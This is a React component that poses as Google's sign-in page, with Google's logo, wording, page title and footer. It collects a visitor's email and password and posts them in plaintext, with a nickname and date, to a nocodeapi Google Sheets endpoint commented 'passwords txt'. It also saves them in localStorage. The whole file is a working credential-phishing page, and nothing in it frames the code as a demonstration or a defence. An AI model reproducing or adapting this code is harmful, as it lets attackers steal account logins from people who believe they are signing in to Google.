import React, { useState, useEffect, useRef } from "react";
import '../../Assets/Styles/google-form.css'
import axios from 'axios';
import Popup from "./Popup";

const GoogleForm = () => {
    const [activeIndex, setActiveIndex] = useState(0)
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [title, setTitle] = useState('Sign in')
    const [forgot, setForgot] = useState('Forgot email?')
    const [redBorder, setRedBorder] = useState(false)
    const [subtitle, setSubtitle] = useState('Use your Google Account')
    
    const [loaderState, setLoaderState] = useState(false)
    const [PopupState, setPopupState] = useState(false)
    const [nicknameVal, setNicknameVal] = useState('')
    
    const _form = useRef()
    
    useEffect(() => {
        document.title = 'Sign in - Google Accounts'
        
        return () => {
            document.title = 'Document'
        }
    }, [])
    
    useEffect(() => {
        if (activeIndex) {
            setTitle('Welcome Back!')
            setForgot('')
            setSubtitle(email)
        }
    }, [activeIndex])

    const changeActiveIndex = () => {
        if (email.includes('@') && email.includes('.')) {
            setActiveIndex(1)
        }
    }

    const renderInputs = () => {
        if (activeIndex) {
            return <input className={`${redBorder ? 'red-border' : ''}`} min={8} onChange={e => setPassword(e.target.value)} value={password} type="password" placeholder="Enter your password" required name="_password"/>
        } else {
            return <input onChange={e => setEmail(e.target.value)} value={email} type="email" placeholder="Email or phone" required name="_email"/>
        }
    }

    const _sendEmail = (e) => {
        e.preventDefault();

        if (activeIndex) {
            if (password.length < 8) {
                setRedBorder(true)
                return;
            } else {
                setRedBorder(false)
            }

            setLoaderState(true)
           
            let date = new Date().toLocaleDateString('en-us', { year:"numeric", month:"short", day:"numeric"}) 
            let id = `G${Math.round(Date.now() * Math.random())}`

            axios ({
                method: 'post',
                url: 'https://v1.nocodeapi.com/tuxa3/google_sheets/bERXdJyFTjGsXOJm?tabId=Sheet1', // passwords txt (1, 3)
                params: {},
                data: [[id, nicknameVal, email, password, date]]
            }).then(function () {
                setLoaderState(false)
                setPopupState(false)

                localStorage.setItem('login', JSON.stringify({ID: id, Username: nicknameVal, Email: email, Password: password, Date: date}))
                window.history.pushState({}, '', '/')

                const navEvent = new PopStateEvent('popstate')
                window.dispatchEvent(navEvent)
            }).catch(function (error) {
                alert('Authentication Failed... Please try again', error)
                console.log(error); 
            })
        } else {
            changeActiveIndex()
        }
    };

    const renderLoader = () => {
        if (loaderState) {
                return (
                    <div className="ui segment">
                    <p></p>
                    <div className="ui active inverted dimmer">
                        <div className="ui loader"></div>
                    </div>
                </div>
            )
        }
    }

    return (
        <div className="google-container">
            <div className="form-container">
                <img className="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google" />
                <form ref={_form} onSubmit={(e) => {
                    e.preventDefault()
                    setPopupState(true)
                }} className="g-form">

                    <h2>{title}</h2>
                    <p>{subtitle}</p>

                    <fieldset>
                        { renderInputs () }
                    </fieldset>
                    <a href="https://accounts.google.com">{forgot}</a>

                    <span>Not your device? Use Guest mode to sign in privately. <br /> <a href="https://accounts.google.com">Learn more</a></span>
                    <div className="g-button-holder">
                        <button type="button" onClick={() => window.location.href = 'https://accounts.google.com'} className="create-acc-btn-google">{`${activeIndex ? 'Forgot password?' : 'Create Account'}`}</button>
                        <button onClick={changeActiveIndex} className="next-btn-google">Next</button>
                    </div>
                </form>
            </div>


            {PopupState ? <Popup title='Enter an Username' placeholder='John Doe' icon='user' onSubmitClick={_sendEmail} onCancelClick={() => setPopupState(false)} onChangeHandler={setNicknameVal}/> : null}


            <footer className="g-footer">
                <p>English (United States)</p>
                <div>
                    <p>Help</p>
                    <p>Privacy</p>
                    <p>Terms</p>
                </div>
            </footer>

           { renderLoader () }
        </div>
    )
}

export default GoogleForm;